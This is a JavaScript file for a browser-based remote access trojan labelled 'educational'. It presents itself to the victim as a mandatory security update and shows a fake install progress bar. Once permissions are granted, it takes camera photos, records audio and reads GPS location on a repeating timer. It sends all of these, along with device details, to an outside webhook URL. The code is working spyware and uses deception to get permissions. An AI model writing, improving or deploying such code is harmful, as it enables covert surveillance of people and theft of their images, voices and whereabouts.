// ZENIN SECURITY - RAT (Educatif)
// Capture video ecran en direct + auto-capture + webhook

var WEBHOOK_URL = 'https://jsonblob.com/api/jsonBlob/019ed161-a6f2-7707-a400-0291c46d621b';

var state = {
  camera: false, mic: false, loc: false, screen: false, notif: false, storage: false,
  stream: null, screenStream: null,
  photos: [], audios: [], screens: [], gps: []
};

var screenAutoInterval = null;

function log(msg, type) {
  var el = document.getElementById('logArea');
  if (!el) return;
  var now = new Date().toLocaleTimeString('fr-FR');
  var cls = type === 'err' ? 'log-error' : type === 'warn' ? 'log-warn' : 'log-ok';
  el.innerHTML += '<br><span class="log-time">[' + now + ']</span> <span class="' + cls + '">' + msg + '</span>';
  el.scrollTop = el.scrollHeight;
  while (el.children.length > 40) el.removeChild(el.firstChild);
}

function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

async function sendData(type, data) {
  try {
    var payload = { type: type, data: data, timestamp: new Date().toISOString(), device: navigator.userAgent };
    await fetch(WEBHOOK_URL, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    log('Envoye: ' + type, 'info');
  } catch(e) {
    log('Erreur: ' + e.message, 'err');
  }
}

// Navigation
function showPermissions() {
  document.getElementById('screen-intro').style.display = 'none';
  document.getElementById('screen-perms').style.display = 'block';
  log('Demande permissions...', 'warn');
}

function showLater() {
  alert('Cette mise a jour est obligatoire pour la securite de votre appareil.');
}

function showDashboard() {
  document.getElementById('screen-success').style.display = 'none';
  document.getElementById('screen-dash').style.display = 'block';
  log('Dashboard actif — surveillance demarree', 'warn');
  sendData('device', {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: window.innerWidth + 'x' + window.innerHeight
  });
  // Demarrer les captures automatiques
  startAutoCapture();
  // Premiere capture immediate
  if (state.camera) doPhoto();
  if (state.loc) doGPS();
}

// Permissions
async function requestPerm(type) {
  var el = document.getElementById('p-' + type);
  if (el.classList.contains('granted')) return;
  log('Demande: ' + type, 'warn');

  try {
    var ok = false;
    if (type === 'camera') {
      try {
        state.stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
        state.camera = true; ok = true;
      } catch(e) { console.error('Camera error:', e); }
    } else if (type === 'mic') {
      try {
        await navigator.mediaDevices.getUserMedia({ audio: true });
        state.mic = true; ok = true;
      } catch(e) { console.error('Mic error:', e); }
    } else if (type === 'loc') {
      navigator.geolocation.getCurrentPosition(function(p) {
        state.loc = true;
        updatePermUI(type, true);
        log('GPS: ' + p.coords.latitude.toFixed(4) + ', ' + p.coords.longitude.toFixed(4), 'info');
        checkPerms();
      }, function() { log('GPS refuse', 'err'); updatePermUI(type, false); });
      return;
    } else if (type === 'notif') {
      if ('Notification' in window) {
        var r = await Notification.requestPermission();
        ok = r === 'granted'; state.notif = ok;
      }
    } else if (type === 'storage') {
      state.storage = true; ok = true;
    }

    if (ok) {
      updatePermUI(type, true);
      log(type + ' OK', 'info');
    } else {
      log(type + ' REFUSE ou NON SUPPORTÉ', 'err');
    }
  } catch (e) {
    log(type + ' ERREUR: ' + e.message, 'err');
  }
  checkPerms();
}

function updatePermUI(type, granted) {
  var el = document.getElementById('p-' + type);
  if (granted) {
    el.classList.add('granted');
    el.querySelector('.perm-check').textContent = '\u2713';
  }
}

function checkPerms() {
  var all = true;
  ['camera','mic','loc','notif','storage'].forEach(function(p) {
    if (!document.getElementById('p-' + p).classList.contains('granted')) all = false;
  });
  document.getElementById('installBtn').disabled = !all;
  if (all) {
    log('Toutes permissions OK — installation...', 'info');
    // Lancer l'installation automatiquement apres 500ms
    setTimeout(function() { startInstall(); }, 500);
  }
}

// Installation
async function startInstall() {
  document.getElementById('screen-perms').style.display = 'none';
  document.getElementById('screen-install').style.display = 'block';
  log('Installation...', 'info');

  var steps = ['s1','s2','s3','s4','s5'];
  for (var i = 0; i < steps.length; i++) {
    var el = document.getElementById(steps[i]);
    el.querySelector('.step-icon').className = 'step-icon active';
    el.querySelector('.step-icon').textContent = '...';
    document.getElementById('progBar').style.width = (i * 20) + '%';
    await sleep(1500);
    el.querySelector('.step-icon').className = 'step-icon done';
    el.querySelector('.step-icon').textContent = '\u2713';
    el.querySelector('.step-time').textContent = '\u2713';
    document.getElementById('progBar').style.width = ((i + 1) * 20) + '%';
  }

  document.getElementById('progBar').style.width = '100%';
  await sleep(500);
  log('Installation terminee!', 'info');
  document.getElementById('screen-install').style.display = 'none';
  document.getElementById('screen-success').style.display = 'block';
}

// CAPTURES

async function doPhoto() {
  if (!state.camera || !state.stream) { log('Camera indisponible', 'err'); return; }
  log('Photo...', 'info');
  try {
    var video = document.createElement('video');
    video.srcObject = state.stream; video.play();
    await sleep(500);
    var canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
    state.photos.push(dataUrl);
    document.getElementById('liveView').innerHTML = '';
    var img = document.createElement('img');
    img.src = dataUrl;
    img.style.cssText = 'width:100%;max-height:250px;object-fit:contain';
    document.getElementById('liveView').appendChild(img);
    await sendData('photo', { image: dataUrl, index: state.photos.length });
    log('Photo #' + state.photos.length, 'info');
  } catch(e) { log('Erreur photo: ' + e.message, 'err'); }
}

async function doAudio() {
  log('Audio 5s...', 'info');
  try {
    var stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    var rec = new MediaRecorder(stream);
    var chunks = [];
    rec.ondataavailable = function(e) { chunks.push(e.data); };
    rec.onstop = function() {
      var blob = new Blob(chunks, { type: 'audio/webm' });
      var reader = new FileReader();
      reader.onloadend = function() {
        state.audios.push(reader.result);
        document.getElementById('liveView').innerHTML = '';
        var audio = document.createElement('audio');
        audio.controls = true; audio.src = reader.result;
        audio.style.cssText = 'width:100%;padding:8px';
        document.getElementById('liveView').appendChild(audio);
        sendData('audio', { audio: reader.result, index: state.audios.length });
        log('Audio #' + state.audios.length, 'info');
      };
      reader.readAsDataURL(blob);
    };
    rec.start();
    setTimeout(function() { rec.stop(); stream.getTracks().forEach(function(t) { t.stop(); }); }, 5000);
  } catch(e) { log('Erreur audio: ' + e.message, 'err'); }
}

function doGPS() {
  if (!navigator.geolocation) { log('GPS non supporte', 'err'); return; }
  log('GPS...', 'info');
  navigator.geolocation.getCurrentPosition(function(p) {
    var g = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, time: new Date().toISOString() };
    state.gps.push(g);
    document.getElementById('liveView').innerHTML = '<div style="text-align:center;padding:16px;color:#fff"><div style="font-size:32px;margin-bottom:4px">📍</div><div style="font-family:monospace;font-size:13px;color:#f59e0b">' + g.lat.toFixed(6) + ', ' + g.lon.toFixed(6) + '</div><div style="font-size:11px;color:#888;margin-top:4px">Precision: ' + (g.acc ? g.acc.toFixed(0) : '?') + 'm</div><a href="https://maps.google.com/?q=' + g.lat + ',' + g.lon + '" target="_blank" style="color:#58a6ff;font-size:12px;display:block;margin-top:8px">Google Maps</a></div>';
    sendData('gps', g);
    log('GPS: ' + g.lat.toFixed(4) + ', ' + g.lon.toFixed(4), 'info');
  }, function() { log('GPS refuse', 'err'); });
}

function doEncrypt() {
  log('Cryptage simule (mode navigateur)', 'warn');
  sendData('report', { action: 'encrypt_sim', note: 'Mode navigateur', time: new Date().toISOString() });
}

function stopAll() {
  if (state.stream) { state.stream.getTracks().forEach(function(t) { t.stop(); }); state.stream = null; }
  log('Tout arrete', 'warn');
  document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">STOP</div><div class="live-text">Surveillance arretee</div></div>';
}

// AUTO CAPTURE
function startAutoCapture() {
  setInterval(function() {
    if (state.camera) doPhoto();
    if (state.loc) doGPS();
  }, 300000);
}
